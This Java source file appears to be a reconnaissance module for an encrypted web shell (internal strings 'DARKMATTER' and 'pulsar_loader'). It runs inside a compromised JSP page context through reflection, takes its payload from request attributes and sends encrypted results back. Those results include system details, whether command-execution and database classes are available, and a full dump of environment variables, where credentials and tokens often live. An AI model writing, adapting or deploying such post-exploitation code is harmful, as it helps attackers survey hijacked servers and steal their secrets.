import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class info extends ClassLoader
{
    public info(ClassLoader objParent) { super(objParent); }
    public info() { super(info.class.getClassLoader()); }
    
    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            StringBuilder sb = new StringBuilder();

            sb.append(fnGenerateHtml());

            String szOutput = sb.toString();

            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    public static String fnGenerateHtml()
    {
        StringBuilder html = new StringBuilder();
        html.append("<table border='1' cellpadding='5' cellspacing='0' style='font-family: Arial; border-collapse: collapse; width:100%;'>");

        html.append("<tr><th colspan='2' style='background:#1d3557; color:white;'>SYSTEM & JAVA INFO</th></tr>");
        html.append("<tr><td>Operating System</td><td>" + System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")</td></tr>");
        html.append("<tr><td>Java/JDK Version</td><td>" + System.getProperty("java.version") + " (" + System.getProperty("java.vendor") + ")</td></tr>");
        html.append("<tr><td>Architecture</td><td>" + System.getProperty("os.arch") + "</td></tr>");
        html.append("<tr><td>Available Processors</td><td>" + Runtime.getRuntime().availableProcessors() + "</td></tr>");
        
        double freeMemoryMb = (double) Runtime.getRuntime().freeMemory() / 1024 / 1024;
        html.append("<tr><td>Free Memory (MB)</td><td>" + String.format("%.2f", freeMemoryMb) + " MB</td></tr>");
        html.append("<tr><th colspan='2' style='background:#457b9d; color:white;'>CORE CLASS / COMPONENT ACCESSIBILITY</th></tr>");

        String[] targetClasses = {
            "java.lang.ProcessBuilder",
            "javax.script.ScriptEngineManager",
            "java.util.Base64",
            "org.apache.catalina.connector.Request",
            "com.mysql.cj.jdbc.Driver",
            "org.postgresql.Driver",
            "oracle.jdbc.driver.OracleDriver"
        };

        for (String clsName : targetClasses)
        {
            String status = "NOT INSTALLED";
            try
            {
                Class.forName(clsName);
                status = "AVAILABLE";
            }
            catch (ClassNotFoundException e)
            {
                status = "NOT AVAILABLE";
            }
            html.append("<tr><td>" + clsName + "</td><td>" + status + "</td></tr>");
        }

        html.append("<tr><th colspan='2' style='background:#e63946; color:white;'>ENVIRONMENT VARIABLES</th></tr>");
        
        Map<String, String> env = System.getenv();
        Object[] keys = env.keySet().toArray();
        Arrays.sort(keys);

        for (Object keyObj : keys)
        {
            String key = (String) keyObj;
            String val = env.get(key);
            
            String safeKey = fnEscapeHtml(key);
            String safeVal = fnEscapeHtml(val);
            
            html.append("<tr><td>" + safeKey + "</td><td>" + safeVal + "</td></tr>");
        }

        html.append("</table>");
        return html.toString();
    }

    private static String fnEscapeHtml(String input) {
        if (input == null)
            return "";

        return input.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
